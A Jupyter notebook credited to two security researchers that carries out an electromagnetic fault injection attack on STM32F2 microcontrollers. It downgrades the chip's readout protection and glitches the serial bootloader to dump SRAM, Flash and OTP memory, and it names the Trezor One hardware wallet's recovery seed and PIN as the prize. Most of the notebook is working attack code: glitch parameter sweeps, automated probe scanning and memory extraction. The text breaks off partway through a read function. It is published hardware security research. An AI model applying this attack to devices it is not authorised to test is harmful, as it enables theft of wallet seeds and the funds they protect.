## 3a_stm32_f2_attack_emfi

### STM32F2 Code Protection Defeat and Memory Extraction

Authors: [Joe Grand](https://joegrand.com) and [Lennert Wouters](https://x.com/lennertwo)

This notebook uses EMFI to downgrade from RDP2 to RDP1 and then glitch the STM32 serial bootloader. After successful downgrade, we will use the `Read Memory` bootloader command to exfiltrate 256 bytes at a time from the target device.

Requires [ChipSHOUTER](https://www.newae.com/products/nae-cw520), [ChipWhisperer-Husky](https://www.newae.com/products/nae-cwhusky), [NewAE CW308 UFO Board](https://rtfm.newae.com/Targets/CW308%20UFO/), [Segger J-Link](https://www.segger.com/products/debug-probes/j-link/), and [STM32F2](https://www.st.com/en/microcontrollers-microprocessors/stm32f2-series.html) with socket/adapter board. For automated scanning, use [ChipShover](https://github.com/newaetech/ChipShover) or generic CNC milling machine w/ [GRBL](https://github.com/gnea/grbl) controller.

Resources:

* [Main project page](https://grandideastudio.com/portfolio/security/stm32-fault-injection/)
* [GitHub repository](https://github.com/joegrand/stm32-fault-injection/)
* License: [GNU General Public License v3.0 or later](https://github.com/joegrand/stm32-fault-injection/blob/master/LICENSE.txt)

<img src="./img/emfi_platform.jpg" style="width: 65%;">

In [ ]:
import sys
import subprocess
import time

from cwwrapper_emfi import *
from chipshouter import ChipSHOUTER
import serial
from stmbl import *
from tqdm.notebook import tqdm
import random
import itertools  
from bokeh.plotting import figure, show
from bokeh.io import output_notebook, push_notebook
from bokeh.layouts import column
from bokeh.palettes import Dark2_5 as palette
import numpy as np
import pylink         # PyLink (Segger J-Link) + Add raw JTAG support (https://github.com/square/pylink/pull/86)

## 1. Initial setup

### 1.1 ChipWhisperer-Husky
`ScopeWrapper` is a wrapper over the `Scope` class that adds some convenience functions.

In [ ]:
try:
    scope.dis()        # Ensure the ChipWhiserer is closed
except:
    pass
    
scope = ScopeWrapper()

print("\nChipWhisperer Python Version:", cw.__version__)
print("ChipWhisperer Serial Number:", scope.sn)

### 1.2 ChipSHOUTER

In [ ]:
try:
    if cs.status() == True:
        cs.disconnect()
except NameError:
    pass
    
cs = ChipSHOUTER('/dev/tty.usbserial-NA4ZIWB5')

cs.reset = True            # Force hardware reset to clear any faults
cs.absent_temp = 15        # Maximum allowable time without checking temperature sensors
cs.mute = False

cs.hwtrig_mode = True      # Trigger polarity active-high
cs.hwtrig_term = False     # External SMB hardware trigger as high-Z
cs.pat_enable = False      # Disable pattern trigger
cs.voltage = 350           # Output/coil voltage level (glitch quality is also dependent on Z height to target)
cs.pulse.width = 160
cs.pulse.repeat = 1        # Single pulse per trigger

In [ ]:
def arm_cs(voltage):
    cs.absent_temp = 15
    cs.faults_current = False
    cs.voltage = voltage

    if cs.state != 'armed':
        cs.armed = False
        time.sleep(1)
        cs.armed = True
        time.sleep(2)

### 1.3 Segger J-Link

In [ ]:
# https://pylink.readthedocs.io/en/latest/
jlink = pylink.JLink()

if jlink.opened() == False:
    jlink.open()

jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)   # Set Target Interface as JTAG

print(jlink.product_name)

In [ ]:
# Retrieve IDCODE via low-level JTAG SHIFTDR, does not connect to target
def pylink_idcode():
    jlink.open()
    jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)   # Set Target Interface as JTAG
    jlink.jtag_raw_rw([0], [0x1F], 5)         # JTAG Reset (TMS = 1 for 5 bits)
    jlink.jtag_raw_rw([0], [0x02], 4)         # JTAG ID read (IDCODE should be in DR upon TAP reset)
    result = jlink.jtag_raw_rw([0]*8, [0]*8)  # Shift to see what's on scan chain
    hex_id = hex(struct.unpack("<I", bytes(result[0:4]))[0])    
    return(hex_id)

In [ ]:
print(pylink_idcode())

### 1.4 CNC Platform

Adjust the Z axis so the probe is as close as possible to the target chip while still being able to move it. A piece of paper should be able to slide between the probe and target chip. The voltage required for a successful fault is directly related to the probe height above the target chip, but may affect other parameters as well.

Position the ChipSHOUTER probe over the target chip at the back left corner [0, 0]

**Ensure external remote is disconnected and RST on controller has been pressed.**

In [ ]:
# Initialize CNC controller
global cnc

#PORT_CNC         = "/dev/tty.usbserial-1140"       # DoesBot GRBL CNC controller (MBP)
PORT_CNC         = "/dev/tty.usbserial-14140"      # DoesBot GRBL CNC controller (Cart)

try:
    cnc.close()   # Ensure the port is closed
except NameError:
    pass
except serial.SerialException:
    pass

cnc = serial.Serial(
          port = PORT_CNC,
          baudrate = 115200,
          parity = serial.PARITY_NONE,
          stopbits = serial.STOPBITS_ONE,
          bytesize = serial.EIGHTBITS,
          timeout = 1
      )
        
time.sleep(3)                            # Wait for the controller to initialize
print(cnc.read_all().decode().strip())   # Read Grbl initialization string

In [ ]:
# Send a command to the CNC and wait for an 'ok' response
def cnc_send_command(command):
    try:
        cnc.write((command + '\n').encode())   # Send the command
        cnc.flush()                            # Ensure it's transmitted
        #print(f"Sent: {command}")
       
        response = cnc.readline().decode().strip()   # Read response from the CNC
        #print(f"Received: {response}")
            
        if response == 'ok':
            return True
        elif 'error' in response:
            print(f"Error: {response}")
            return False

    except serial.SerialException as e:
        print(f"Serial Error: {e}")
        return False

In [ ]:
cnc_send_command("G21")                  # Set units to millimeters
cnc_send_command("G94")                  # Set feed rate to units per minute
cnc_send_command("G10 L2 P1 X0 Y0 Z0")   # Set current CNC position as zero/origin
cnc_send_command("G54")                  # Activate the Work Coordinate System
cnc_send_command("G90")                  # Set absolute positioning mode
    
# All subsequent G0 or G1 commands sent to the CNC are absolute coordinates relative to the defined origin
# Example: "G1 X0.1 Y0.1 F100" will move (+0.1, +0.1) in mm at a feed rate of 100mm/min

In [ ]:
cnc_send_command("G1 X4.5 Y4.5 Z0 F100")   # Set probe position (optional)

In [ ]:
cnc_send_command("G1 X1.2 Y0.8 Z0 F100")   # CW/CCW probe adjustment (optional)

In [ ]:
cnc_send_command("G1 X2.1 Y6.4 Z0 F100")   # F2/F4 probe adjustment (optional)

In [ ]:
cnc_send_command("G1 X0 Y0 Z0 F100")       # Return to zero

## 2. RDP2 Downgrade

With successful fault injection of the STM32, RDP2 will be downgraded to RDP1. This enables JTAG/SWD, bootloader, and access to RAM. Physical position of the ChipSHOUTER probe is determined by the results of `1_stm32_characterize.ipynb`.

### 2.1 Setup trigger for the downgrade glitch

1. Take a few side-channel measurements during a power cycle using nRST as a rising edge trigger
2. Select a pattern for SAD triggering
3. Verify that SAD triggering works reliably

In [ ]:
scope.nrst_trigger()

In [ ]:
ntraces = 10
nrst_traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8')

scope.disable_glitch()
scope.io.nrst = 'high_z'
scope.io.pdic = True
scope.gain.db = 34

for i in tqdm(range(ntraces)):
    scope.io.target_pwr = False       # Power off target via CW +3.3V
    time.sleep(0.075)
    scope.arm()                       # Arm ChipWhisperer
    scope.io.target_pwr = True        # Power on target via CW +3.3V
    
    scope.capture(poll_done=True)                        # Capture trace
    nrst_traces[i] = scope.get_last_trace(as_int=True)   # Store captured trace into array

In [ ]:
scope.simple_plot(nrst_traces, 5)

In [ ]:
downgrade_pattern = nrst_traces[0][19050 - scope.SAD.sad_reference_length:]   # End of reference trace
scope.sad_trigger_downgrade(downgrade_pattern, 15, 20)

In [ ]:
ntraces = 10
sad_traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8')

scope.disable_glitch()
scope.io.nrst = 'high_z'
scope.io.pdic = True

for i in tqdm(range(ntraces)):
    scope.io.target_pwr = False
    time.sleep(0.1)
    scope.arm()
    scope.io.target_pwr = True
    
    scope.capture(poll_done=True)                        # Capture trace
    sad_traces[i] = scope.get_last_trace(as_int=True)    # Store captured trace into array

In [ ]:
scope.simple_plot(sad_traces, 5)

### 2.2 Downgrade glitch

In [ ]:
glitch_width = 10

glitch_voltage_start = 400
glitch_voltage_end = 500

glitch_offset_start = 0
glitch_offset_end = 200

#### Option 1: Manual

In [ ]:
# Set probe position
cnc_downgrade_x = 1.0
cnc_downgrade_y = 5.0

cnc_send_command(f"G1 X{cnc_downgrade_x} Y{cnc_downgrade_y} Z0 F100")

In [ ]:
stbl = StmBl(scope.scopetype.usart, debug=False)

scope.enable_glitch()
scope.sad_trigger_downgrade()

arm_cs(glitch_voltage_start)

x_coord = cnc_downgrade_x
y_coord = cnc_downgrade_y

scope.io.nrst = 'high_z'
stop = False

for voltage in range(glitch_voltage_start, glitch_voltage_end + 1, 5):
    if stop:
        break
        
    r = cs.trigger_safe
    cs.voltage = voltage

    for i in tqdm(range(50), desc=f"Attempting downgrade at {voltage}V"):
        goffset = random.randint(glitch_offset_start, glitch_offset_end)
        scope.glitch.ext_offset = goffset
        scope.glitch.repeat = glitch_width

        #r = cs.trigger_safe                
        scope.io.target_pwr = False
        time.sleep(0.075)
        scope.arm()
        scope.io.target_pwr = True
        scope.capture(poll_done=True)
        time.sleep(0.05)

        # JTAG + BL
        idc = pylink_idcode()
        if (idc != '0xffffffff' and idc != '0x0'):
            print(f"X: {x_coord}, Y: {y_coord}, Voltage: {voltage}, JTAG IDCODE: {idc}")
            
            # It's possible to successfully downgrade, but not have access to the STM32 Serial Bootloader
            # Attempt to connect to the bootloader to verify
            try:
                scope.bl_connect()
                #scope.bl_connect_retry()
            except:
                continue
            else:
                print(f"Successful downgrade using {voltage}V at offset {goffset}")
                scope.downgrade_voltage = voltage
                scope.downgrade_offset = goffset
                stbl.connected = True
                a, b, c = stbl.get_version()
                print('Version: 0x%02x, option 1: %d, option 2: %d' %(a,b,c))
                stop = True
                break        
        
cs.armed = 0
scope.disable_glitch()

#### Option 2: CNC Scan

In [ ]:
# CNC Range (Relative to zero position)
# Trezor One: STM32F205RET6/RGT6 (LQFP64, 10 x 10mm)
PACKAGE_X   = 9.0
PACKAGE_Y   = 9.0

CNC_X_MIN   = 0.0
CNC_X_MAX   = PACKAGE_X
CNC_Y_MIN   = 0.0
CNC_Y_MAX   = PACKAGE_Y
CNC_STEP    = 0.5

# Calculate the number of points needed so that the interval is divided by the step size
x_points = round((CNC_X_MAX - CNC_X_MIN) / CNC_STEP) + 1
y_points = round((CNC_Y_MAX - CNC_Y_MIN) / CNC_STEP) + 1

# Initialize current probe position to allow for restarts
x_current = CNC_X_MIN
y_current = CNC_Y_MIN

In [ ]:
print(f"Attempting RDP2 -> RDP1 Downgrade Glitch")
print(f"Voltage range: {glitch_voltage_start}, {glitch_voltage_end}")
print(f"Package size: {PACKAGE_X} x {PACKAGE_Y}")
print(f"X range: {CNC_X_MIN}, {CNC_X_MAX}")
print(f"Y range: {CNC_Y_MIN}, {CNC_Y_MAX}")
print(f"Step size: {CNC_STEP}\n")

stbl = StmBl(scope.scopetype.usart, debug=False)

scope.enable_glitch()
scope.sad_trigger_downgrade()

arm_cs(glitch_voltage_start)

scope.io.nrst = 'high_z'
stop = False

for x_coord in np.round(np.linspace(CNC_X_MIN, CNC_X_MAX, x_points), decimals=1):
    if stop:
        break

    if x_coord < x_current:  # Skip until restart position is reached
        continue
        
    for y_coord in np.round(np.linspace(CNC_Y_MIN, CNC_Y_MAX, y_points), decimals=1):
        if stop:
            break

        if x_coord == x_current and y_coord < y_current:  # Skip until restart position is reached, first iteration only
           continue

        x_current = x_coord
        y_current = y_coord

        # Move to the next position (absolute coordinates relative to the defined origin)
        cnc_success = cnc_send_command(f"G0 X{x_coord} Y{y_coord} Z0")
            
        if not cnc_success:
            print('CNC SERIAL ERROR')
            stop = True
            break
                
        time.sleep(0.25)  # Wait for CNC to finish move
        
        if y_coord == CNC_Y_MIN:
            time.sleep(1)   # Wait additional time for CNC to finish move back to axis origin   
        
        for voltage in range(glitch_voltage_start, glitch_voltage_end + 1, 5):
            if stop:
                break
                
            r = cs.trigger_safe
            cs.voltage = voltage
        
            for i in range(20):
                goffset = random.randint(glitch_offset_start, glitch_offset_end)
                scope.glitch.ext_offset = goffset
                scope.glitch.repeat = glitch_width

                sys.stdout.write(f"\rX: {x_coord}, Y: {y_coord}, Voltage: {voltage}, Try: {i+1}, Width: {glitch_width}, Offset: {goffset}    ")
                sys.stdout.flush()   # Force update without newlines        

                #r = cs.trigger_safe                
                scope.io.target_pwr = False
                time.sleep(0.075)
                scope.arm()
                scope.io.target_pwr = True
                scope.capture(poll_done=True)
                time.sleep(0.05)
                
                # JTAG + BL
                idc = pylink_idcode()
                if (idc != '0xffffffff' and idc != '0x0'):
                    print("\nJTAG IDCODE: " + idc)
                    
                    # It's possible to successfully downgrade, but not have access to the STM32 Serial Bootloader
                    # Attempt to connect to the bootloader to verify
                    try:
                        scope.bl_connect()
                        #scope.bl_connect_retry()
                    except:
                        continue
                    else:
                        print(f"Successful downgrade using {voltage}V at offset {goffset}")
                        scope.downgrade_voltage = voltage
                        scope.downgrade_offset = goffset
                        cnc_downgrade_x = x_coord
                        cnc_downgrade_y = y_coord
                        stbl.connected = True
                        a, b, c = stbl.get_version()
                        print('Version: 0x%02x, option 1: %d, option 2: %d' %(a,b,c))
                        stop = True
                        break                
                
print("\nDone!")
cs.armed = 0
scope.disable_glitch()

### 2.3 Trezor One <= 1.6.0

For Trezor One firmware versions <= 1.6.0, the critical metadata (recovery seed + PIN) is copied into RAM during the boot process. We can simply extract the contents using JTAG/SWD and view in plaintext using the `strings` command. If the STM32 is on a non-socket board or in a socket, an external 8 MHz crystal oscillator (preferred load capacitance 18 pF) is required on PH0-OSC_IN. If using the CW308 UFO Board, J3 must be set to CRYSTAL.

In [ ]:
scope.io.nrst = False
time.sleep(0.25)
scope.io.pdic = False      # Set BOOT0 LOW to run Trezor/user code
scope.io.nrst = True
time.sleep(0.25)

In [ ]:
jlink.set_tif(pylink.enums.JLinkInterfaces.SWD)   # Set Target Interface as SWD

jlink.connect('STM32F205RG')                      # Connect to STM32
print("SWD IDCODE: " + hex(jlink.core_id()))      # Confirm that we are successfully connected

In [ ]:
scope.io.pdic = False      # Set BOOT0 LOW to run Trezor/user code
jlink.reset(500, False)    # Reset STM32
time.sleep(5)              # Allow time for Trezor code to initialize/execute
jlink.halt()               # Halt STM32

In [ ]:
sram = jlink.memory_read8(0x20000000, 131072)         # Read Trezor One metadata from SRAM
DATA_FILE = f"./output/SRAM_{int(time.time())}.bin"   # Create unique filename based on time to avoid overwriting prior data
out_file = open(DATA_FILE, "wb")                      # Open file to write extracted data in binary
out_file.write((''.join(chr(i) for i in sram)).encode('charmap'))
out_file.close()

# Display any printable ASCII data within the extracted binary
result = subprocess.run(['strings', DATA_FILE], capture_output=True, text=True)
print(result.stdout)

### 2.4 Verify downgrade

In [ ]:
# Reconnect and reduce speed if BL is less responsive
scope.io.nrst = False
time.sleep(0.5)
scope.io.pdic = True    # Set BOOT0 HIGH to enter STM32 Serial Bootloader
scope.io.nrst = True

scope.scopetype.usart.init(9600, stopbits=1, parity="even")
scope.bl_connect(0.5)

In [ ]:
stbl = StmBl(scope.scopetype.usart, debug=False)
stbl.connected = True
a, b, c = stbl.get_version()
print('Version: 0x%02x, option 1: %d, option 2: %d' %(a,b,c))

A successful downgrade will allow us to access the bootloader's serial interface. This access persists through regular soft resets. However, if a crash or power cycle of the chip occurs we have to re-enable bootloader access. The next cell defines a function that performs a downgrade using the previously discovered parameters.

In [ ]:
def downgrade():
    cnc_send_command(f"G1 X{cnc_downgrade_x} Y{cnc_downgrade_y} Z0 F100")
    time.sleep(1)  # Wait for CNC to finish move
        
    scope.enable_glitch()
    scope.sad_trigger_downgrade()
    
    scope.glitch.ext_offset = scope.downgrade_offset
    scope.glitch.repeat = glitch_width

    arm_cs(scope.downgrade_voltage)
    
    scope.io.nrst = 'high_z'
    
    for i in tqdm(range(50), desc=f"Attempting downgrade at {scope.downgrade_voltage}V"):
        goffset = random.randint(glitch_offset_start, glitch_offset_end)
        scope.glitch.ext_offset = goffset
    
        #r = cs.trigger_safe                
        scope.io.target_pwr = False
        time.sleep(0.075)
        scope.arm()
        scope.io.target_pwr = True
        scope.capture(poll_done=True)
        time.sleep(0.05)

        try:
            scope.bl_connect()
            #scope.bl_connect_retry()
            print(f"Successful downgrade using {scope.downgrade_voltage}V at offset {goffset}")
            break
        except:
            continue

    cs.armed = 0
    scope.disable_glitch()

## 3. Read data

On Trezor One firmware versions > 1.6.0, the critical metadata (recovery seed + PIN) is no longer accessible via RAM and is only stored in Flash memory. 

On Trezor One firmware versions >= 1.8.0, the contents are encrypted. The additional data/key material required for brute forcing is stored in Flash memory and OTP.

Since RDP1 doesn't allow direct access to Flash memory, OTP, or memory-mapped registers through JTAG/SWD or bootloader, we will exploit the bootloader's Read Memory command to read 256 bytes of memory at a time. Most bootloader commands, including Read Memory, check the state of RDP before executing the command, so we will need to inject a fault each time we call the command in order to bypass this check. 

### 3.1 Setup trigger for the Read Memory glitch

1. Take a few side-channel measurements while sending the Read Memory command using an edge counter to trigger as soon as the command is sent
2. Select a pattern for SAD triggering
3. Verify that SAD triggering works reliably

In [ ]:
ntraces = 10
read_traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8') # Integer for SAD
#read_traces = np.zeros((ntraces, scope.adc.samples), dtype='float32')  # Floating point for ADC

scope.bl_read_edge_trigger()
scope.disable_glitch()
scope.gain.db = 27

for i in tqdm(range(ntraces)):
    scope.bl_connect_retry()
    #scope.bl_connect(0.5)

    scope.scopetype.usart.write(bytes([int(stbl.Command.READ_MEMORY)]))
    scope.arm()
    scope.scopetype.usart.write(bytes([scope.bl_checksum(int(stbl.Command.READ_MEMORY))]))

    scope.capture(poll_done=True)                         # Capture trace
    read_traces[i] = scope.get_last_trace(as_int=True)    # Store captured trace into array (integer for SAD)
    #read_traces[i] = scope.get_last_trace(as_int=False)   # Store captured trace into array (floating point for ADC)

In [ ]:
scope.simple_plot(read_traces, 5)

Zoom in on the trace and try to set an appropriate level for the SAD or ADC level trigger. Depending on the SCA trace of the target chip will determine which trigger method you choose. As before, make sure that the triggering works reliably by ensuring you get consistent results with no mistriggers or misalignment.

#### Option 1: SAD trigger

In [ ]:
read_pattern = read_traces[0][X - scope.SAD.sad_reference_length:]   # End of reference trace, value needs to be determined through characterization
scope.sad_trigger_bl(read_pattern, 15, 30)

In [ ]:
ntraces = 10
read_sad_traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8')

scope.disable_glitch()

for i in tqdm(range(ntraces)):
    scope.bl_connect_retry()
    #scope.bl_connect(0.5)

    scope.scopetype.usart.write(bytes([int(stbl.Command.READ_MEMORY)]))
    scope.arm()
    scope.scopetype.usart.write(bytes([scope.bl_checksum(int(stbl.Command.READ_MEMORY))]))

    scope.capture(poll_done=True)                             # Capture trace
    read_sad_traces[i] = scope.get_last_trace(as_int=True)    # Store captured trace into array

In [ ]:
scope.simple_plot(read_sad_traces, 5)

#### Option 2: ADC level trigger

In [ ]:
gain = 27
level = X   # Value needs to be determined through characterization
scope.adc_trigger(level=level, gain=gain)

ntraces = 10
read_adc_traces = np.zeros((ntraces, scope.adc.samples), dtype='float32')

scope.disable_glitch()

for i in tqdm(range(ntraces)):
    scope.bl_connect_retry()
    #scope.bl_connect(0.5)

    scope.scopetype.usart.write(bytes([int(stbl.Command.READ_MEMORY)]))
    scope.arm()
    scope.scopetype.usart.write(bytes([scope.bl_checksum(int(stbl.Command.READ_MEMORY))]))

    scope.capture(poll_done=True)
    read_adc_traces[i] = scope.get_last_trace(as_int=False)

In [ ]:
scope.simple_plot(read_adc_traces, 5)

### 3.2 Glitch the Read Memory command

In [ ]:
bl_glitch_width = 11

bl_glitch_voltage_start = 300
bl_glitch_voltage_end = 350

bl_glitch_offset_start = 0
bl_glitch_offset_end = 200

In [ ]:
nbytes = 32             # Number of bytes to read (up to 256 bytes allowed)
address = 0x1FFF7860    # STM32 OTP (One Time Programmable) Area Block 3

addr = address.to_bytes(4, 'big')
addr = addr + bytearray([scope.bl_checksum(addr)])

#### Option 1: Manual

In [ ]:
# Set probe position
#cnc_bl_x = cnc_downgrade_x
#cnc_bl_y = cnc_downgrade_y

cnc_bl_x = 7.0
cnc_bl_y = 11.0

cnc_send_command(f"G1 X{cnc_bl_x} Y{cnc_bl_y} Z0 F100")

In [ ]:
scope.enable_glitch()
scope.sad_trigger_bl()
#scope.adc_trigger(level=level, gain=gain)

arm_cs(bl_glitch_voltage_start)

scope.io.nrst = 'high_z'
stop = False

for voltage in range(bl_glitch_voltage_start, bl_glitch_voltage_end + 1, 5):
    if stop:
        break
        
    r = cs.trigger_safe
    cs.voltage = voltage

    for i in tqdm(range(50), desc=f"Attempting read at {voltage}V"):
        goffset = random.randint(bl_glitch_offset_start, bl_glitch_offset_end)
        scope.glitch.ext_offset = goffset
        scope.glitch.repeat = bl_glitch_width

        r = cs.trigger_safe
        #try:
        scope.bl_connect_retry()
        #scope.bl_connect(0.5)

        """
        except ValueError:
            downgrade()
            cnc_send_command(f"G1 X{cnc_bl_x} Y{cnc_bl_y} Z0 F100")
            time.sleep(1)  # Wait for CNC to finish move            
            scope.bl_connect_retry()
            scope.enable_glitch()
            scope.sad_trigger_bl()
            #scope.adc_trigger(level=level, gain=gain)
            arm_cs(voltage)
        """
        
        scope.scopetype.usart.write(bytes([int(stbl.Command.READ_MEMORY)]))
        scope.arm()
        scope.scopetype.usart.write(bytes([scope.bl_checksum(int(stbl.Command.READ_MEMORY))]))
        
        if scope.capture(poll_done=True):  # If Husky didn't see the expected trigger
            stop = True
            break
            """
            downgrade()
            cnc_send_command(f"G1 X{cnc_bl_x} Y{cnc_bl_y} Z0 F100")
            time.sleep(1)  # Wait for CNC to finish move            
            scope.enable_glitch()
            scope.sad_trigger_bl(read_pattern)
            #scope.adc_trigger(level=level, gain=gain)
            scope.glitch.repeat = bl_glitch_width
            scope.glitch.ext_offset = goffset
            arm_cs(voltage)
            """
            
        ret = scope.scopetype.usart.read()
        if len(ret) > 0 and ret[0] != stbl.nack:  # If response is not NACK
            print(f"First response {ret.hex(sep=' ')}")
                  
        if len(ret) > 0 and ret[0] == stbl.ack:   # 1st ACK
            scope.scopetype.usart.write(addr)        # Send starting address to read
            time.sleep(0.05)
            r = scope.scopetype.usart.read(1)
            #print(f"Second response {r.hex(sep=' ')}")
            
            if len(r) > 0 and r[0] == stbl.ack:   # 2nd ACK
                scope.scopetype.usart.write(bytes([nbytes-1, scope.bl_checksum(nbytes-1)]))   # Send number of bytes to read
                data = bytearray(scope.scopetype.usart.read(nbytes+1))
                #print(f"Third response {data.hex(sep=' ')}")
    
                if len(data) > 0 and data[0] == stbl.ack:   # 3rd ACK                            
                    print(f"Successful read at {address:#010x} using {voltage}V at offset {goffset}")
                    print(f"Response:\n{data.hex(sep=' ')}")
                    scope.bl_voltage = voltage
                    scope.bl_offset = goffset
                    stop = True
                    break
            
cs.armed = 0
scope.disable_glitch()

#### Option 2: CNC Scan

In [ ]:
# CNC Range (Relative to zero position)
# Trezor One: STM32F205RET6/RGT6 (LQFP64, 10 x 10mm)
PACKAGE_X   = 9.0
PACKAGE_Y   = 9.0

CNC_X_MIN   = 0.0
CNC_X_MAX   = PACKAGE_X
CNC_Y_MIN   = 0.0
CNC_Y_MAX   = PACKAGE_Y
CNC_STEP    = 0.5

# Calculate the number of points needed so that the interval is divided by the step size
x_points = round((CNC_X_MAX - CNC_X_MIN) / CNC_STEP) + 1
y_points = round((CNC_Y_MAX - CNC_Y_MIN) / CNC_STEP) + 1

# Initialize current probe position to allow for restarts
bl_x_current = CNC_X_MIN
bl_y_current = CNC_Y_MIN

In [ ]:
print(f"Attempting Bootloader Read Glitch")
print(f"Voltage range: {bl_glitch_voltage_start}, {bl_glitch_voltage_end}")
print(f"Package size: {PACKAGE_X} x {PACKAGE_Y}")
print(f"X range: {CNC_X_MIN}, {CNC_X_MAX}")
print(f"Y range: {CNC_Y_MIN}, {CNC_Y_MAX}")
print(f"Step size: {CNC_STEP}\n")

scope.enable_glitch()
scope.sad_trigger_bl()
#scope.adc_trigger(level=level, gain=gain)

arm_cs(bl_glitch_voltage_start)

scope.io.nrst = 'high_z'
stop = False

for x_coord in np.round(np.linspace(CNC_X_MIN, CNC_X_MAX, x_points), decimals=1):
    if stop:
        break

    if x_coord < bl_x_current:  # Skip until restart position is reached
        continue
        
    for y_coord in np.round(np.linspace(CNC_Y_MIN, CNC_Y_MAX, y_points), decimals=1):
        if stop:
            break

        if x_coord == bl_x_current and y_coord < bl_y_current:  # Skip until restart position is reached, first iteration only
           continue

        bl_x_current = x_coord
        bl_y_current = y_coord

        # Move to the next position (absolute coordinates relative to the defined origin)
        cnc_success = cnc_send_command(f"G0 X{x_coord} Y{y_coord} Z0")
            
        if not cnc_success:
            print('CNC SERIAL ERROR')
            stop = True
            break
                
        time.sleep(0.25)  # Wait for CNC to finish move
        
        if y_coord == CNC_Y_MIN:
            time.sleep(1)   # Wait additional time for CNC to finish move back to axis origin   
                
        for voltage in range(bl_glitch_voltage_start, bl_glitch_voltage_end + 1, 5):
            if stop:
                break
                
            r = cs.trigger_safe
            cs.voltage = voltage
        
            for i in range(50):
                goffset = random.randint(bl_glitch_offset_start, bl_glitch_offset_end)
                scope.glitch.ext_offset = goffset
                scope.glitch.repeat = bl_glitch_width

                sys.stdout.write(f"\rX: {x_coord}, Y: {y_coord}, Voltage: {voltage}, Try: {i+1}, Width: {bl_glitch_width}, Offset: {goffset}    ")
                sys.stdout.flush()   # Force update without newlines  
                
                #r = cs.trigger_safe
                #try:
                scope.bl_connect_retry()
                #scope.bl_connect(0.5)

                """
                except ValueError:
                    downgrade()
                    cnc_send_command(f"G1 X{x_coord} Y{y_coord} Z0 F100")
                    time.sleep(1)  # Wait for CNC to finish move
                    scope.bl_connect_retry()
                    scope.enable_glitch()
                    scope.sad_trigger_bl()
                    #scope.adc_trigger(level=level, gain=gain)
                    arm_cs(voltage)
                """
                
                scope.scopetype.usart.write(bytes([int(stbl.Command.READ_MEMORY)]))
                scope.arm()
                scope.scopetype.usart.write(bytes([scope.bl_checksum(int(stbl.Command.READ_MEMORY))]))
        
                if scope.capture(poll_done=True):  # If Husky didn't see the expected trigger
                    stop = True
                    break
                    """
                    downgrade()
                    cnc_send_command(f"G1 X{x_coord} Y{y_coord} Z0 F100")
                    time.sleep(1)  # Wait for CNC to finish move
                    scope.enable_glitch()
                    scope.sad_trigger_bl(read_pattern)
                    #scope.adc_trigger(level=level, gain=gain)
                    scope.glitch.repeat = bl_glitch_width
                    scope.glitch.ext_offset = goffset
                    arm_cs(voltage)
                    """
                    
                ret = scope.scopetype.usart.read()

                if len(ret) > 0 and ret[0] != stbl.nack:  # If response is not NACK
                    print(f"\nFirst response {ret.hex(sep=' ')}")
                          
                if len(ret) > 0 and ret[0] == stbl.ack:   # 1st ACK
                    scope.scopetype.usart.write(addr)        # Send starting address to read
                    time.sleep(0.05)
                    r = scope.scopetype.usart.read(1)
                    #print(f"Second response {r.hex(sep=' ')}")
                    
                    if len(r) > 0 and r[0] == stbl.ack:   # 2nd ACK
                        scope.scopetype.usart.write(bytes([nbytes-1, scope.bl_checksum(nbytes-1)]))   # Send number of bytes to read
                        data = bytearray(scope.scopetype.usart.read(nbytes+1))
                        #print(f"Third response {data.hex(sep=' ')}")
            
                        if len(data) > 0 and data[0] == stbl.ack:   # 3rd ACK                            
                            print(f"Successful read at {address:#010x} using {voltage}V at offset {goffset}")
                            print(f"Response:\n{data.hex(sep=' ')}")
                            scope.bl_voltage = voltage
                            scope.bl_offset = goffset
                            cnc_bl_x = x_coord
                            cnc_bl_y = y_coord
                            stop = True
                            break

print("\nDone!")
cs.armed = 0
scope.disable_glitch()

### 3.3 Read remaining data from target

In [ ]:
FLASH_DUMP = "./output/flash.bin"     # STM32 Flash memory contents
OTP_DUMP   = "./output/otp.bin"       # Hardware entropy data from STM32 OTP
UID_DUMP   = "./output/uid.bin"       # Unique ID from STM32

In [ ]:
# STM32 OTP (One Time Programmable) Area
# 0x1FFF7800 - 0x1FFF7A0F, 528 bytes per STM32F205xx Reference Manual Table 2 and STM32F405xx Reference Manual Table 5
# Trezor uses OTP Block 3: Entropy/Randomness, 256 bits (32 bytes): 0x1FFF7860 - 0x1FFF787F
# https://docs.trezor.io/trezor-firmware/core/misc/memory.html

#data = bl_read(0x1FFF7860, 32)
if data:
    data = data[1:]  # Remove ACK
    print(f"Response:\n{data.hex(sep=' ')}")
    
    with open(OTP_DUMP, 'wb') as file:
        file.write(data)

In [ ]:
def bl_read(address, nbytes):
    cs.mute = False
    
    addr = address.to_bytes(4, 'big')
    addr = addr + bytearray([scope.bl_checksum(addr)])

    scope.enable_glitch()
    scope.sad_trigger_bl()
    #scope.adc_trigger(level=level, gain=gain)

    scope.glitch.ext_offset = scope.bl_offset
    scope.glitch.repeat = bl_glitch_width

    arm_cs(scope.bl_voltage)
    
    scope.io.nrst = 'high_z'

    timeout = False

    #while True:
    #for i in range(500):
    for i in tqdm(range(500), desc=f"Attempting read using {scope.bl_voltage}V at offset {scope.glitch.ext_offset}"):
        r = cs.trigger_safe

        if timeout == True:  # If Husky didn't see the expected SAD pattern on the previous attempt
            stop = True
            break
            """
            downgrade()
            cnc_send_command(f"G1 X{cnc_bl_x} Y{cnc_bl_y} Z0 F100")
            scope.enable_glitch()
            scope.sad_trigger_bl()
            #scope.adc_trigger(level=level, gain=gain)
            scope.glitch.ext_offset = scope.bl_offset
            scope.glitch.repeat = bl_glitch_width          
            arm_cs(scope.bl_voltage)
            timeout = False
            """
        #try:
        scope.bl_connect_retry()
        #scope.bl_connect(0.5)
        
        """    
        except ValueError:
            downgrade()
            cnc_send_command(f"G1 X{cnc_bl_x} Y{cnc_bl_y} Z0 F100")
            scope.bl_connect_retry()
            scope.enable_glitch()
            scope.sad_trigger_bl()
            #scope.adc_trigger(level=level, gain=gain)
            scope.glitch.ext_offset = scope.bl_offset
            scope.glitch.repeat = bl_glitch_width          
            arm_cs(scope.bl_voltage)
        """
        
        scope.scopetype.usart.write(bytes([int(stbl.Command.READ_MEMORY)]))
        scope.arm()
